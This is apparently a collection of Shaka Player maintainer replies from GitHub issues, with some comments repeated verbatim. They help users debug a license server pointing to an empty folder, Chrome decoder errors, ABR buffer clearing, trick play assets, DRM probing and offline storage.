106,115,34,32,99,104,97,114,115,101,116,61,34,85,84,70,45,56,34,62\n    60,47,115,99,114,105,112,116,62,60,47,104,101,97,100,62,10,32,60,98\n    111,100,121,62,10,60,104,49,62,73,110,100,101,120,32,111,102,32,47,112\n    114,111,120,121,60,47,104,49,62,10,32,32,60,116,97,98,108,101,62,10\n    32,32,32,60,116,114,62,60,116,104,32,118,97,108,105,103,110,61,34,116\n    111,112,34,62,60,105,109,103,32,115,114,99,61,34,47,105,99,111,110,115\n    47,98,108,97,110,107,46,103,105,102,34,32,97,108,116,61,34,91,73,67\n    79,93,34,62,60,47,116,104,62,60,116,104,62,60,97,32,104,114,101,102\n    61,34,63,67,61,78,59,79,61,68,34,62,78,97,109,101,60,47,97,62\n    60,47,116,104,62,60,116,104,62,60,97,32,104,114,101,102,61,34,63,67\n    61,77,59,79,61,65,34,62,76,97,115,116,32,109,111,100,105,102,105,101\n    100,60,47,97,62,60,47,116,104,62,60,116,104,62,60,97,32,104,114,101\n    102,61,34,63,67,61,83,59,79,61,65,34,62,83,105,122,101,60,47,97\n    62,60,47,116,104,62,60,116,104,62,60,97,32,104,114,101,102,61,34,63\n    67,61,68,59,79,61,65,34,62,68,101,115,99,114,105,112,116,105,111,110\n    60,47,97,62,60,47,116,104,62,60,47,116,114,62,10,32,32,32,60,116\n    114,62,60,116,104,32,99,111,108,115,112,97,110,61,34,53,34,62,60,104\n    114,62,60,47,116,104,62,60,47,116,114,62,10,60,116,114,62,60,116,100\n    32,118,97,108,105,103,110,61,34,116,111,112,34,62,60,105,109,103,32,115\n    114,99,61,34,47,105,99,111,110,115,47,98,97,99,107,46,103,105,102,34\n    32,97,108,116,61,34,91,80,65,82,69,78,84,68,73,82,93,34,62,60\n    47,116,100,62,60,116,100,62,60,97,32,104,114,101,102,61,34,47,34,62\n    80,97,114,101,110,116,32,68,105,114,101,99,116,111,114,121,60,47,97,62\n    60,47,116,100,62,60,116,100,62,38,110,98,115,112,59,60,47,116,100,62\n    60,116,100,32,97,108,105,103,110,61,34,114,105,103,104,116,34,62,32,32\n    45,32,60,47,116,100,62,60,116,100,62,38,110,98,115,112,59,60,47,116\n    100,62,60,47,116,114,62,10,60,116,114,62,60,116,100,32,118,97,108,105\n    103,110,61,34,116,111,112,34,62,60,105,109,103,32,115,114,99,61,34,47\n    105,99,111,110,115,47,116,101,120,116,46,103,105,102,34,32,97,108,116,61\n    34,91,84,88,84,93,34,62,60,47,116,100,62,60,116,100,62,60,97,32\n    104,114,101,102,61,34,112,114,111,120,121,46,112,121,34,62,112,114,111,120\n    121,46,112,121,60,47,97,62,60,47,116,100,62,60,116,100,32,97,108,105\n    103,110,61,34,114,105,103,104,116,34,62,50,48,49,54,45,48,57,45,49\n    53,32,48,49,58,49,57,32,32,60,47,116,100,62,60,116,100,32,97,108\n    105,103,110,61,34,114,105,103,104,116,34,62,53,46,48,75,60,47,116,100\n    62,60,116,100,62,38,110,98,115,112,59,60,47,116,100,62,60,47,116,114\n    62,10,32,32,32,60,116,114,62,60,116,104,32,99,111,108,115,112,97,110\n    61,34,53,34,62,60,104,114,62,60,47,116,104,62,60,47,116,114,62,10\n    60,47,116,97,98,108,101,62,10,60,97,100,100,114,101,115,115,62,65,112\n    97,99,104,101,47,50,46,52,46,55,32,40,85,98,117,110,116,117,41,32\n    83,101,114,118,101,114,32,97,116,32,53,50,46,49,57,56,46,49,48,46\n    53,53,32,80,111,114,116,32,56,48,60,47,97,100,100,114,101,115,115,62\n    10,60,47,98,111,100,121,62,60,47,104,116,109,108,62,10\"\"\"\nprint ''.join([ chr(int(x)) for x in dec.replace(' ', '').replace('\\n', ',').split(',') ])\n```\nThe output is:\nhtml\n<!DOCTYPE HTML PUBLIC \"-//W3C//DTD HTML 3.2 Final//EN\">\n<html>\n <head>\n  <title>Index of /proxy</title>\n <script type=\"text/javascript\" src=\"http://gc.kis.scr.kaspersky-labs.com/BD71B644-91B7-4944-A571-01C3D5705430/main.js\" charset=\"UTF-8\"></script></head>\n <body>\n<h1>Index of /proxy</h1>\n  <table>\n   <tr><th valign=\"top\"><img src=\"/icons/blank.gif\" alt=\"[ICO]\"></th><th><a href=\"?C=N;O=D\">Name</a></th><th><a href=\"?C=M;O=A\">Last modified</a></th><th><a href=\"?C=S;O=A\">Size</a></th><th><a href=\"?C=D;O=A\">Description</a></th></tr>\n   <tr><th colspan=\"5\"><hr></th></tr>\n<tr><td valign=\"top\"><img src=\"/icons/back.gif\" alt=\"[PARENTDIR]\"></td><td><a href=\"/\">Parent Directory</a></td><td>&nbsp;</td><td align=\"right\">  - </td><td>&nbsp;</td></tr>\n<tr><td valign=\"top\"><img src=\"/icons/text.gif\" alt=\"[TXT]\"></td><td><a href=\"proxy.py\">proxy.py</a></td><td align=\"right\">2016-09-15 01:19  </td><td align=\"right\">5.0K</td><td>&nbsp;</td></tr>\n   <tr><th colspan=\"5\"><hr></th></tr>\n</table>\n<address>Apache/2.4.7 (Ubuntu) Server at 52.198.10.55 Port 80</address>\n</body></html>\nSo it seems your license server URL is pointing to an empty folder.\nOne easy way you could have spotted this for yourself is by using the Developer Tools in Chrome.  Hit Ctrl+Shift+I or right click the page and choose \"Inspect\".  Then, go to the network tab and try to load the content.  Finally, find the license request in the list of network requests and click on it.  Choose the \"Preview\" or \"Response\" tabs on the right-hand side to see what your server returned.\n. I see a bandwidth requirement of around 5Mbps, but an estimated bandwidth around 50Mbps.  Also, buffering time is low and appears to represent initial buffering only.  So we aren't looking at a lack of bandwidth causing a stutter.\nI also see no dropped frames, or at least none reported.  Dropped frames would indicate a lack of CPU/GPU power to decode & render in real time.\nI also see video adaptation about 7 seconds after startup, from 1.5Mbps 720p to 5Mbps 720p.  When adapting, v2 would clear 10s ahead of the playhead, so that corresponds to your 17s problem spot.\nIf you load the stream again, the player already knows how much bandwidth you have and does not need to adapt.  This is why there is no problem until you reload the page.\n@yairans, we have made some changes recently so that we consider segment boundaries when deciding how much content to clear.  We no longer hard-code 10s.  This has helped with similar issues on other browsers.  Can you please retest with the nightly build?  http://nightly.shaka-player-demo.appspot.com/demo/?asset=http://qa-nginx-vod.dev.kaltura.com/dash/p/1091/sp/109100/serveFlavor/entryId/0_rd5ko090/v/2/flavorId/0_,zfgyzbls,q6o5z8f3,5na0i0y6,/forceproxy/true/name/a.mp4.urlset/manifest.mpd\n. Is this the same content from #549?  It appears that piece of content doesn't follow DASH interop guidelines, so these two issues may be one and the same.  It may not be reasonable to expect that piece of content to play well on any browser.\n. Thanks, we'll consider this feature request when we start planning v2.1.\n. Looks like a decoder error.  @cpeterso, should we move to Firefox bugzilla or continue here?\n. Thanks, Chris!  I'll mark external bug for now, and close once 49 goes stable.\n. We already support robustness settings.  See \"Advanced DRM Configuration\" in the DRM Configuration tutorial.\nWe don't set robustness by default because that would require us to hard-code knowledge of valid robustness levels, which are not defined in the EME spec.  Each key system has its own set of valid robustness strings.\n. The message is ominous, though.  For now, the empty string is allowed by the EME spec and is meaningful:\n\nrobustness of type DOMString, defaulting to \"\"\n\nThe robustness level associated with the content type. The empty string indicates that any ability to decrypt and decode the content type is acceptable.\n\n\nWe'll keep an eye out for changes on this.  Perhaps the message references an older version of the spec in which this was not well defined.\n. Ah, I see.  Thanks for the correction, David.\n. Have we answered this question to everyone's satisfaction?  Can we close it?\n. @Zorig, are you using the demo app or a custom app?  If custom, are you using shaka.media.DrmEngine.probeSupport()?. @hghazzi, I am unable to reproduce this on my Nexus phone.  What version of Android and Chrome are you using?  What make/model of Android device are you using?\n. Based on the error code, I would say it's probably a decoder failure.  However, I'm testing on a Nexus 5X as well, with Android 6.0.1, build MTC19T, Chrome 53.0.2785.124, and I still can't reproduce.  There's no obvious reason why we should be getting different results.  You are running an official build of Android, correct?\nI'll ask if anyone else in the office here can try on different Android devices.  Perhaps one of them will reproduce your issue and we can start making educated guesses on why.\nIn the mean time, please try on other devices for yourself.  I do not believe you should get this result, and I expect there is something peculiar about your device.\nIf we can somehow make Shaka Player more robust on that device, we will.  But depending on what the cause is, there may be nothing we can do.\n. @hghazzi, can you get logs for me to help us figure this out?\nGo to the shaka player demo, recreate the error, then open a new tab.  Navigate to chrome:media-internals.  On the media-internals page, under the heading \"Players\", click the button with a label like blob:https://shaka-player-demo.appspot.com/... and logs should appear at the bottom.  If you could select all, copy, and then paste here for us, that would be very helpful.\n. Thanks for the logs!  (I reformatted them into markdown.)\nI will have to ask for help from someone on Chrome team.  I don't know what to make of this info yet.\n. Can you provide logs from adb?  I've been advised to ask for adb logcat -v threadtime or adb bugreport.  I assume these logs will be long, so please attach as a file rather than pasting into github.\n. Sorry, I do not have any news.  I am still unable to reproduce this issue myself.  There seems to be a decoder error, which is outside the control of Shaka Player.  I've forwarded your logs to someone at Chrome and I have not received a reply yet.\nMy advice to you is to file a bug on Chrome here: http://crbug.com/\nWhen you have done so, please link to the bug report here so that we can track the issue and try to raise the profile of the issue with the Chrome team.. @hghazzi, @bbert, has anything changed for you on this issue?  Are you still seeing decoder failures on Android with the latest Chrome and Shaka Player?. I'm still unable to reproduce it myself.  I will try to get advice from Chrome team again.  I apologize that we have been unable to help you so far.. Chrome team has reproduced the error and are investigating.  So far, it appears to be a bug in Chrome for Android, and it appears to be specific to Vorbis content.  I will try to keep you posted as we learn more.. @hghazzi, in your screenshot, it appears that you have selected an asset that is MP4 only.  What Chrome team is investigating is specific to Vorbis.  Can you confirm if this issue can be reproduced with the asset \"Tears of Steel (Widevine)\" specifically?. This bug was not resolved.  It was tracked down to something outside Shaka Player, either in Chrome or Android, and was given the \"external\" label to indicate that.  We still do not know the reason for the original poster's issue, and my team is unable to reproduce the issue on any of our Android devices.. I do not know if a bug has been filed with Chrome.  @hghazzi, did you ever file anything at crbug.com?. Hi Yair, Dobrin,\nWe are working on it and hope to release improvements in v2.0.1 as soon as feasible.  Thanks!\n. In a8ac3142ef515c14275f548af6905066b22198c2 we made buffer clearing explicit and more flexible for calls to selectTrack().  When the ABR manager is making the call, though, it still decides if/when/how to clear the buffer.\n. The thing that fixed it was probably when we switched from clearing 10 seconds ahead to clearing 2 segments ahead.  Clearing based on segment size reflects the reality of how MediaSource works, while 10 seconds was only a guess at the segment size anyway.\n@yairans, can you confirm that this has improved things for you as well?\n. Excellent!  Thank you for retesting.\n. I'm now seeing hiccups on ChromeOS and Chrome Linux.  The hiccup occurs when an upgrade decision is made, specifically caused by clearing content that is ahead of the playhead.\nMore testing is needed on other browsers/platforms.\n. Please fix the linter errors and run ./build/all.py to verify locally.  Let us know when you have updated the PR and I'll run it through the bot again.\n. Thanks very much for your contribution!\n. Destroying the proxy does not destroy the remote session because you might wish to leave it open.  Many cast apps allow the sender to be shut down while allowing the receiver to continue running.\nHowever, it appears we don't have a method on CastProxy to force the receiver to shut down.  We can definitely add that.\n. @hghazzi, it's not clear to me what you're asking for.  Are you asking for the key ID to be extracted from the manifest automatically?  Or to be able to specify keys without key IDs?\n. There is a standard way to store key IDs in a DASH manifest.  However, they are optional and may not be present.\nEven if key IDs were required, it still wouldn't be enough for the app to provide the keys alone.  Content often has multiple keys.  It is best practice to use different keys for audio and video, or generally to use different keys for any tracks with different security requirements (SD vs HD vs UHD, for example).\nSo if we extracted key IDs from the manifest, and the app provided keys only, there would be no way for us to match up the keys to their key IDs.\nAn encrypted segment contains the ID of the key needed to decrypt it.  So the browser's media pipeline must be able to ask the CDM to decrypt using a particular key ID.  Without a mapping of key ID to key in the license, the CDM can't do its job.  Without a mapping of key ID to key from the app, Shaka Player can't construct the license the clear key CDM needs.\nDoes that make sense?\n. See shaka.Player.getStats() and shakaExterns.Stats in the docs.  You can get the current bandwidth estimate like so:\njs\nplayer.getStats().estimatedBandwidth\nThere is also an AdaptationEvent fired when the player makes an ABR decision.  To listen for the event and see what was chosen, try this:\njs\nplayer.addEventListener('adaptation', function() {\n  var tracks = player.getTracks();  // all tracks\n  tracks.forEach(function(t) {\n    if (t.active) {  // an active track, that is, in use by the player right now\n      console.log('ACTIVE:', t.type, t);\n    }\n  });\n});\nIf you have questions and you don't think a github issue is appropriate, you can always write to our users list: https://groups.google.com/forum/#!forum/shaka-player-users\nDoes this help?\n. @vahid-01, did we answer your question?  Is this still an issue for you, or can we close this?\n. Looks like python 3 is being invoked for gjslint.  @sandersaares, can you confirm if python invokes python3 in your environment?\nWe have 'python' hard-coded into the command lines of two of our build steps:\ncheck.py:  cmd_line = ['python', cmd] + args + get_lint_files()\ngendeps.py:    cmd_line = ['python', deps_writer] + deps_args\nPerhaps those should say python2, specifically.  @sandersaares, please try changing those to python2 and see if it resolves your issue.\n. Window is supported, but we don't test the Windows build often enough.  We'll fix it.  Thanks for the report!\n. @nitin02, offline storage and playback are supported via the APIs in shaka.offline.Storage.  The storage system gives you back a structure containing an offline URI.  Just use player.load(uri) to play back offline content.  You can also list stored content with shaka.offline.Storage.prototype.list().\nNote that browsers must support EME's persistent-license session type in order to store encrypted content.  Currently, the only browser that does today is ChromeOS.  We hope to see persistent-license support on desktop Chrome, Edge, and others in the future.  When that happens, no changes should be necessary in Shaka Player.\n@sandersaares, Edge and IE11 do not support persistent licenses in the way EME specifies.  In particular, they do not support the persistent-license session type.  PlayReady has a somewhat different concept of persistence which is independent of session type.  In fact, Edge ignores the requested session type completely:  https://developer.microsoft.com/en-us/microsoft-edge/platform/issues/7564170/\nBecause Edge and IE11 aren't following the spec, Shaka Player can't use persistent licenses on those browsers yet.\n. Yes, PlayReady persistence seems to be controlled by license policy rather than session type.  So you request a temporary session and sometimes there's no license request because PlayReady has found a persisted license already.  The trouble is that the app has no visibility into the persistence of temporary licenses, and can't ask for a persistent one explicitly.\n. Since this is essentially about which browsers support persistent licenses, I am closing this as a duplicate of #512.  Let us know if you feel this was a mistake on our part, and I can reopen for further discussion.\n. Fixed by #529 (d05b7d5d0ce3b844f193327f5f5fe66d8f70f312)\n. Looks like you'll need to update the tests to match.  You can run the tests for yourself with python build/test.py.\n. It's likely an issue with the stream, but we'll look into it.  Thanks for the report!\n. This appears to be a bug in Edge.  We will file a bug on them and add a workaround until they fix it.\n. https://developer.microsoft.com/en-us/microsoft-edge/platform/issues/9127291/\n. There's a workaround in place for now.  You should see everything working at http://nightly.shaka-player-demo.appspot.com/demo/ .  If not, please let us know.\n. @sridhard, this feature has already been implemented.  You can register a request filter to modify any network request.  You can modify URLs, headers, and/or request bodies.\nSee the License Server Authentication tutorial for an example that adds URL parameters to a license request.  You can do the same for a segment request by looking for request type SEGMENT instead of LICENSE.\n. @sridhard, does this answer your question?  Do you still need help with this, or can we close this issue?\n. The issue is that the browser's built in video controls are insufficient for live streams.  You can't tell the browser that the seekable range is anything but 0 - duration.\nWe recommend implementing your own controls instead.  We have an example of this in our demo app (demo/controls.js).  The Player object has a seekRange() method you can poll to see what part of the timeline should be exposed to the user in the controls.\n. Thanks!\n. Hi Geoffrey,\nHere's the problem.  When we adapt resolutions or bitrates, we can't clear everything without an interruption in playback.  If we clear what's under the playhead, playback must stop.\nWhen we adapt down, we don't clear at all, because we want to leave the high quality content in buffer as much as possible.  When we adapt up, we clear most of what's buffered, starting 2 segments ahead of the playhead.\nWe introduced the 2-segment rule in a8ac3142ef515c14275f548af6905066b22198c2, and we just sped up ABR decisions in 8152e649f1fda29c1792020e05378033ab56a7f8.  With the latest code using our 60-second clip on loop, I see the first 8 seconds (2 segments) at 360p, while the rest is at 576p.  Hopefully, this is an improvement over what you were seeing before.\nIf you want to get everything cleared, we would have to clear behind the playhead once it progressed into the high res part of the buffer.  Doing this just to optimize looping on a short clip doesn't make much sense for us.\nHere are some ideas.  I would guess that any one of these would help in your scenario:\n1. Set bufferBehind small at first, then up it to the length of the clip after the first loop is complete.\n2. If you have some prior knowledge of the user's bandwidth, set bufferBehind large and set abr.defaultBandwidthEstimate to give us a hint on which track is the best one to use.\n3. For a short clip, choose a track explicitly with player.selectTrack() (which will disable ABR) and set bufferingGoal and bufferBehind both to the length of the clip.  Once the clip buffers, it will stay in memory and loop without downloading anything.\n4. Make sure the segments are cacheable by the browser and leave bufferBehind small.  When we loop, the first 2 segments will be new requests for the high bandwidth version, but after that, all segments will be served by the browser's cache from then on.  Disable ABR one the second loop starts, so that the cache responses don't change the bandwidth estimate and cause another track to be selected.\nDoes this help?\n. The error shows that a license request failed.  Inside that is the cause, an HTTP error with status code 500.  HTTP 500 means an error on the server.  Usually, you see HTTP 500s when there is an exception or crash.\nIf you are running your own license server proxy, you should look at your server logs to see what the error is.  If you are using a third-party license server, you should contact the owners of that code to report the error.\n. I have reproduced this on Chrome for Linux.  It appears that your content has gaps in between the periods.  This is not supported.  There should be no gaps in the timeline.  Please report this as a bug to Kaltura.\n. I have reproduced this on Chrome for Linux.  It appears that your content has gaps in between the periods.  This is not supported.  There should be no gaps in the timeline.  Please report this as a bug to Kaltura.\n. It seems I misdiagnosed your stream.  Sorry about that!\n. It seems I misdiagnosed your stream.  Sorry about that!\n. @maxPlayoutRate is not the only limiting factor for trick play rate.  We should also make sure that the trick play track's bandwidth, multiplied by the trick play rate, does not exceed the user's estimated bandwidth.\nFor example, in this test clip from the DASH IF, the lowest bitrate normal stream is about 3x the bitrate of the trick play stream.  For clients unable to play any but the lowest bitrate stream, the max trick play rate would be about 3.\nAnother way to look at it, which would still work for content without a trick play track, is to consider the current playback rate in track selection.  Choose a track based on estimated bandwidth divided by current playback rate.\n. @maxPlayoutRate is not the only limiting factor for trick play rate.  We should also make sure that the trick play track's bandwidth, multiplied by the trick play rate, does not exceed the user's estimated bandwidth.\nFor example, in this test clip from the DASH IF, the lowest bitrate normal stream is about 3x the bitrate of the trick play stream.  For clients unable to play any but the lowest bitrate stream, the max trick play rate would be about 3.\nAnother way to look at it, which would still work for content without a trick play track, is to consider the current playback rate in track selection.  Choose a track based on estimated bandwidth divided by current playback rate.\n. Two working test clips from the DASH IF:\n- http://dash.akamaized.net/dash264/TestCases/9b/qualcomm/1/MultiRate.mpd\n- http://dash.akamaized.net/dash264/TestCases/9b/qualcomm/2/MultiRate.mpd\n. Two working test clips from the DASH IF:\n- http://dash.akamaized.net/dash264/TestCases/9b/qualcomm/1/MultiRate.mpd\n- http://dash.akamaized.net/dash264/TestCases/9b/qualcomm/2/MultiRate.mpd\n. Finally, we should consider how reverse trick play works.  Today, browsers do not support negative playback rates.  It is unclear if they ever will.  We currently use repeated seeking to simulate negative playback rates, but this is not a great experience.\nOur forward trick play experience will be greatly improved by the use of special trick mode tracks, so we should look for a way to improve our reverse trick play experience as well.  Perhaps having a special trick mode track will open up another possibility or allow us to refine the technique we use today.\n. Finally, we should consider how reverse trick play works.  Today, browsers do not support negative playback rates.  It is unclear if they ever will.  We currently use repeated seeking to simulate negative playback rates, but this is not a great experience.\nOur forward trick play experience will be greatly improved by the use of special trick mode tracks, so we should look for a way to improve our reverse trick play experience as well.  Perhaps having a special trick mode track will open up another possibility or allow us to refine the technique we use today.\n. The above-referenced trick-play assets fail to decode in Chrome (except the trick play tracks themselves, ironically).  So we'll need to find other trick play assets.  Media logs (formatted via this script):\n| Timestamp | Property | Value |\n| --- | --- | --- |\n| 00:00:00 00 | pipeline_state | kCreated |\n| 00:00:00 00 | event | WEBMEDIAPLAYER_CREATED |\n| 00:00:00 00 | url | blob:http://localhost/6dd4de73-abdd-4c59-ae4f-1d4ec253bb26 |\n| 00:00:00 00 | pipeline_state | kInitDemuxer |\n| 00:00:00 229 | duration | 654 |\n| 00:00:00 425 | info | Audio codec: mp4a.40.2. Sampling frequency: 24000Hz. Sampling frequency(Extension): 48000Hz. Channel layout: 3. |\n| 00:00:00 425 | found_audio_stream | true |\n| 00:00:00 425 | audio_codec_name | aac |\n| 00:00:00 480 | info | Video codec: avc1.4D401F |\n| 00:00:00 480 | found_video_stream | true |\n| 00:00:00 480 | video_codec_name | h264 |\n| 00:00:00 480 | pipeline_state | kInitRenderer |\n| 00:00:00 482 | audio_dds | false |\n| 00:00:00 482 | audio_decoder | FFmpegAudioDecoder |\n| 00:00:00 483 | video_dds | false |\n| 00:00:00 483 | video_decoder | FFmpegVideoDecoder |\n| 00:00:00 483 | pipeline_state | kPlaying |\n| 00:00:00 694 | error | video frame with PTS 0us has negative DTS -83333us after applying timestampOffset, handling any discontinuity, and filtering against append window |\n| 00:00:00 694 | error | Append: stream parsing failed. Data size=131072 append_window_start=0 append_window_end=654.04 |\n| 00:00:00 698 | pipeline_error | chunk demuxer: append failed |\n| 00:00:00 698 | pipeline_state | kStopping |\n| 00:00:00 699 | pipeline_state | kStopped |\n. The above-referenced trick-play assets fail to decode in Chrome (except the trick play tracks themselves, ironically).  So we'll need to find other trick play assets.  Media logs (formatted via this script):\n| Timestamp | Property | Value |\n| --- | --- | --- |\n| 00:00:00 00 | pipeline_state | kCreated |\n| 00:00:00 00 | event | WEBMEDIAPLAYER_CREATED |\n| 00:00:00 00 | url | blob:http://localhost/6dd4de73-abdd-4c59-ae4f-1d4ec253bb26 |\n| 00:00:00 00 | pipeline_state | kInitDemuxer |\n| 00:00:00 229 | duration | 654 |\n| 00:00:00 425 | info | Audio codec: mp4a.40.2. Sampling frequency: 24000Hz. Sampling frequency(Extension): 48000Hz. Channel layout: 3. |\n| 00:00:00 425 | found_audio_stream | true |\n| 00:00:00 425 | audio_codec_name | aac |\n| 00:00:00 480 | info | Video codec: avc1.4D401F |\n| 00:00:00 480 | found_video_stream | true |\n| 00:00:00 480 | video_codec_name | h264 |\n| 00:00:00 480 | pipeline_state | kInitRenderer |\n| 00:00:00 482 | audio_dds | false |\n| 00:00:00 482 | audio_decoder | FFmpegAudioDecoder |\n| 00:00:00 483 | video_dds | false |\n| 00:00:00 483 | video_decoder | FFmpegVideoDecoder |\n| 00:00:00 483 | pipeline_state | kPlaying |\n| 00:00:00 694 | error | video frame with PTS 0us has negative DTS -83333us after applying timestampOffset, handling any discontinuity, and filtering against append window |\n| 00:00:00 694 | error | Append: stream parsing failed. Data size=131072 append_window_start=0 append_window_end=654.04 |\n| 00:00:00 698 | pipeline_error | chunk demuxer: append failed |\n| 00:00:00 698 | pipeline_state | kStopping |\n| 00:00:00 699 | pipeline_state | kStopped |\n. Since the DASH-IF's test assets for trick play do not decode in Chrome, I will need to make a new one.  I analyzed the trick play track from the manifest linked above, and I see only I-frames at 1 fps.  The segment size is 2s, just as in the normal tracks.  This will not be difficult to replicate.\n. Since the DASH-IF's test assets for trick play do not decode in Chrome, I will need to make a new one.  I analyzed the trick play track from the manifest linked above, and I see only I-frames at 1 fps.  The segment size is 2s, just as in the normal tracks.  This will not be difficult to replicate.\n. @waqarz added new trick mode vectors here: http://testassets.dashif.org/#testvector/list\nThanks!\n. This is deferred until after some HLS-related refactoring is done.  HLS work is higher priority and may conflict with this, since both affect the internal manifest representation.  HLS work is tracked in #279.\n. This is deferred until after some HLS-related refactoring is done.  HLS work is higher priority and may conflict with this, since both affect the internal manifest representation.  HLS work is tracked in #279.\n. Refactoring for HLS is done, so we can now continue work on trick mode.. Refactoring for HLS is done, so we can now continue work on trick mode.. @magreenblatt, proprietary codecs refers to MP4, as opposed to WebM.  Chromium or CEF built without proprietary codec support should still be able to play WebM or multicodec (MP4 + WebM) content.  We have many such assets in the demo app already.\nThe first asset in the list, \"Angel One (multicodec, multilingual)\" should be playable for you in CEF.  Please confirm.\nThe second asset in the list, \"Angel One (multicodec, multilingual, Widevine)\" should be playable if you have a Widevine CDM, which you may not, depending on your Chromium build config.  This is completely different from having support for proprietary codecs.\nThe third asset in the list, \"Angel One (multicodec, multilingual, ClearKey server)\" should be playable as long as you have ClearKey support.  This is usually built into Chromium and should be available to you.  Please confirm.\nFinally, you should use https://shaka-player-demo.appspot.com/support.html to get a complete report of what is and isn't supported by your build of CEF.  This breaks out support for various containers, codecs, and DRM systems.  If you are having trouble getting playback in Shaka Player, a copy of this report is very valuable information for us and will help us direct you to the right fix in your CEF build.\nDoes this help?\n. @magreenblatt, proprietary codecs refers to MP4, as opposed to WebM.  Chromium or CEF built without proprietary codec support should still be able to play WebM or multicodec (MP4 + WebM) content.  We have many such assets in the demo app already.\nThe first asset in the list, \"Angel One (multicodec, multilingual)\" should be playable for you in CEF.  Please confirm.\nThe second asset in the list, \"Angel One (multicodec, multilingual, Widevine)\" should be playable if you have a Widevine CDM, which you may not, depending on your Chromium build config.  This is completely different from having support for proprietary codecs.\nThe third asset in the list, \"Angel One (multicodec, multilingual, ClearKey server)\" should be playable as long as you have ClearKey support.  This is usually built into Chromium and should be available to you.  Please confirm.\nFinally, you should use https://shaka-player-demo.appspot.com/support.html to get a complete report of what is and isn't supported by your build of CEF.  This breaks out support for various containers, codecs, and DRM systems.  If you are having trouble getting playback in Shaka Player, a copy of this report is very valuable information for us and will help us direct you to the right fix in your CEF build.\nDoes this help?\n. We're filling out the \"drm\" section of the support page by using EME APIs such as navigator.requestMediaKeySystemAccess.  The code is here, if you are curious:\nhttps://github.com/google/shaka-player/blob/addece60/lib/media/drm_engine.js#L1187\nPerhaps Chromium intends to enable DRM only with MP4 support, perhaps not.  I wish I could say for certain, but I honestly don't know.  If you think it's a bug, please file it at crbug.com so the Chromium team can give you an authoritative answer.\nIf you do file a chromium bug, please post a link to the bug report so that we can track it as well.\n. We're filling out the \"drm\" section of the support page by using EME APIs such as navigator.requestMediaKeySystemAccess.  The code is here, if you are curious:\nhttps://github.com/google/shaka-player/blob/addece60/lib/media/drm_engine.js#L1187\nPerhaps Chromium intends to enable DRM only with MP4 support, perhaps not.  I wish I could say for certain, but I honestly don't know.  If you think it's a bug, please file it at crbug.com so the Chromium team can give you an authoritative answer.\nIf you do file a chromium bug, please post a link to the bug report so that we can track it as well.\n. Looks like we forgot to probe WebM in DrmEngine!  We'll get that fixed soon.\nIf Widevine is still not showing up as supported, perhaps something is set up incorrectly in your CEF build or its runtime environment.  I think the CEF and Chromium issue trackers are your best bet for further assistance getting the Widevine CDM working correctly in CEF3.  Shaka Player ends at JavaScript, so we can't really do much more for you here.\n. Looks like we forgot to probe WebM in DrmEngine!  We'll get that fixed soon.\nIf Widevine is still not showing up as supported, perhaps something is set up incorrectly in your CEF build or its runtime environment.  I think the CEF and Chromium issue trackers are your best bet for further assistance getting the Widevine CDM working correctly in CEF3.  Shaka Player ends at JavaScript, so we can't really do much more for you here.\n. Great, glad to hear it!  We've fixed the probe code to add webm, so if there are no objections, I'll consider this resolved.\n. Great, glad to hear it!  We've fixed the probe code to add webm, so if there are no objections, I'll consider this resolved.\n. The link to v2 you gave is actually a link to v2.0.0-beta, which is quite old.  Please use the final release of v2.0.0: http://v2-0-0.shaka-player-demo.appspot.com/demo/\nYour live stream is broken.  v1.6 had a complex system that managed to \"fix\" many types of broken manifests, such as this one, but also broke others and did not follow the DASH spec.  v2 is more strict and follows the spec more closely, which means your content must also follow the spec.  This is why it \"worked\" in v1, but not in v2.\nOne thing that jumped out at me when I examined your manifest is that availabilityStartTime appears to be moving when the manifest is updated.  This makes no sense.  availabilityStartTime is critical to determine what is available in a live stream.\nI stopped digging into the manifest once I saw moving availabilityStartTime.  To start, I strongly recommend getting the latest updates from your encoder vendor to make sure you have any bugfixes they may have made for live streams.\nIf you still have problems after updating your encoder, I then recommend you file a bug with the encoder vendor to get support from them.  There are lots of vendors who are getting this right.  We firmly believe that the best thing we can do for the DASH ecosystem is to expect everyone to follow specs and interoperability guidelines.  If we hid or worked around encoder bugs like we did in v1, buggy encoders wouldn't get fixed and we'd have a more complex and buggy client to maintain.\n. The link to v2 you gave is actually a link to v2.0.0-beta, which is quite old.  Please use the final release of v2.0.0: http://v2-0-0.shaka-player-demo.appspot.com/demo/\nYour live stream is broken.  v1.6 had a complex system that managed to \"fix\" many types of broken manifests, such as this one, but also broke others and did not follow the DASH spec.  v2 is more strict and follows the spec more closely, which means your content must also follow the spec.  This is why it \"worked\" in v1, but not in v2.\nOne thing that jumped out at me when I examined your manifest is that availabilityStartTime appears to be moving when the manifest is updated.  This makes no sense.  availabilityStartTime is critical to determine what is available in a live stream.\nI stopped digging into the manifest once I saw moving availabilityStartTime.  To start, I strongly recommend getting the latest updates from your encoder vendor to make sure you have any bugfixes they may have made for live streams.\nIf you still have problems after updating your encoder, I then recommend you file a bug with the encoder vendor to get support from them.  There are lots of vendors who are getting this right.  We firmly believe that the best thing we can do for the DASH ecosystem is to expect everyone to follow specs and interoperability guidelines.  If we hid or worked around encoder bugs like we did in v1, buggy encoders wouldn't get fixed and we'd have a more complex and buggy client to maintain.\n. It might be better to log the warning specifically from the VTTParser, and specifically when the start offset is non-zero.  That way, if the VTT parser is not being used, or if the WebVTT tracks are not segmented, the warning will not be seen.  This should also fix the test failures.\n. It might be better to log the warning specifically from the VTTParser, and specifically when the start offset is non-zero.  That way, if the VTT parser is not being used, or if the WebVTT tracks are not segmented, the warning will not be seen.  This should also fix the test failures.\n. My best guess is that you are not using a web server and instead are using a file:// URL.  This is something the browser does not allow.\n. It seems we don't state this explicitly in the docs.  We will update the docs to fix this.\nIn the mean time, you must run a local web server and access the content from http://localhost/... instead of file:///...\n. @wipawan, please try to use the issue template we provide.  There is much more information we need to investigate this:\n- What version of Shaka Player are you using?\n- Can you reproduce the issue with our latest release version?\n- Can you reproduce the issue with the latest code from master?\n- Can you reproduce the issue using our demo app?\n. I can reproduce using \"Angel One\" and the manual track controls in the \"Info\" panel of the demo app in uncompiled mode.\n- Switching text tracks has an immediate effect.\n- Switching audio tracks does have an effect, but it's not immediately obvious.  If audio has been buffered until time 30, the audio change takes effect at time 30.\n- Switching video tracks behaves the same as audio.\nYou can make the track switching behavior more obvious by reducing the buffering goals.  Run this in the JS console just after clicking \"Load\":\njs\nshakaDemo.player_.configure({streaming: {bufferingGoal: 5, bufferBehind: 5}});\nSo probably the bug is in clearing the buffer.\n. So far, this appears to be a Chromecast bug.  